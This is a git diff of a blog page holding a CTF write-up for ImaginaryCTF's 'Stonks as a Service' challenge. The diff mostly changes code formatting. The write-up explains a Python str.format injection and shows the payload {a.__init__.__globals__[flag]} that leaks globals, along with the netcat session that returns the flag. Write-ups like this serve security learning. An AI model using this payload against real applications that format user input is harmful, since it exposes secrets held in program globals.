@@ -15,6 +15,7 @@
 
     <!-- Theme CSS -->
     <link id="theme-style" rel="stylesheet" href="../../assets/css/style.css">
+    <link id="theme-style" rel="stylesheet" href="../../assets/css/prism.css">
 </head>
 <body class="theme-bg-light">
 
@@ -33,7 +34,7 @@
 
                 <div class="bio mb-3">Student<br>REV @ K3RN3L4RMY</div><!--//bio-->
                 <ul class="social-list list-inline py-3 mx-auto">
-                    <li class="list-inline-item"><a href="" target="_blank"><i class="fab fa-twitter fa-fw"></i></a></li>
+                    <li class="list-inline-item"><a href="https://twitter.com/Abraxus7331" target="_blank"><i class="fab fa-twitter fa-fw"></i></a></li>
                     <li class="list-inline-item"><a href="https://github.com/Kasimir123" target="_blank"><i class="fab fa-github-alt fa-fw"></i></a></li>
                     <li class="list-inline-item"><a href="https://www.linkedin.com/in/kasimir-schulz" target="_blank"><i class="fab fa-linkedin-in fa-fw"></i></a></li>
                 </ul><!--//social-list-->
@@ -73,29 +74,25 @@
 <p>Comments: Wait, I thought format strings were only in C???</p>
 <h2 id="write-up">Write up:</h2>
 <p>Looking at the file (and description) I could tell that this was a format string vulnerability. Looking at the line with the format string we see:</p>
-<div class="lang-py editor-colors">print(inp.format(a=stonkgenerator()))
-</div>
+<pre><code class="language-text">print(inp.format(a=stonkgenerator()))</code></pre>
 <p>We are passed an object a which is of type stonkgenerator, from here we can craft the exploit:</p>
-<div class="lang-py editor-colors">{a.__init__.__globals__[flag]}
-</div>
+<pre><code class="language-text">{a.__init__.__globals__[flag]}</code></pre>
 <p>When run with the nc connection I got:</p>
-<pre><code>nc chal.imaginaryctf.org 42014
+<pre><code class="language-text">nc chal.imaginaryctf.org 42014
 
                                          88
             ,d                           88
             88                           88
 ,adPPYba, MM88MMM ,adPPYba,  8b,dPPYba,  88   ,d8  ,adPPYba,
-I8[    &quot;&quot;   88   a8&quot;     &quot;8a 88P'   `&quot;8a 88 ,a8&quot;   I8[    &quot;&quot;
- `&quot;Y8ba,    88   8b       d8 88       88 8888[      `&quot;Y8ba,
-aa    ]8I   88,  &quot;8a,   ,a8&quot; 88       88 88`&quot;Yba,  aa    ]8I
-`&quot;YbbdP&quot;'   &quot;Y888 `&quot;YbbdP&quot;'  88       88 88   `Y8a `&quot;YbbdP&quot;'
+I8[    ""   88   a8"     "8a 88P'   `"8a 88 ,a8"   I8[    ""
+ `"Y8ba,    88   8b       d8 88       88 8888[      `"Y8ba,
+aa    ]8I   88,  "8a,   ,a8" 88       88 88`"Yba,  aa    ]8I
+`"YbbdP"'   "Y888 `"YbbdP"'  88       88 88   `Y8a `"YbbdP"'
 
 Welcome to Stonks as a Service!
 Enter any input, and we'll say it back to you with any '{a}' replaced with 'stonks'! Try it out!
-&gt; {a.__init__.__globals__[flag]}
-ictf{c4r3rul_w1th_f0rmat_str1ngs_4a2bd219}
-</code></pre>
-
+> {a.__init__.__globals__[flag]}
+ictf{c4r3rul_w1th_f0rmat_str1ngs_4a2bd219}</code></pre>
         </article>
 
         <footer class="footer text-left py-2 theme-bg-dark">
@@ -108,5 +105,6 @@ ictf{c4r3rul_w1th_f0rmat_str1ngs_4a2bd219}
     <!-- Javascript -->
     <script src="../../assets/js/popper.min.js"></script>
     <script src="../../assets/js/bootstrap.min.js"></script>
+    <script src="../../assets/js/prism.js"></script>
 </body>
 </html>
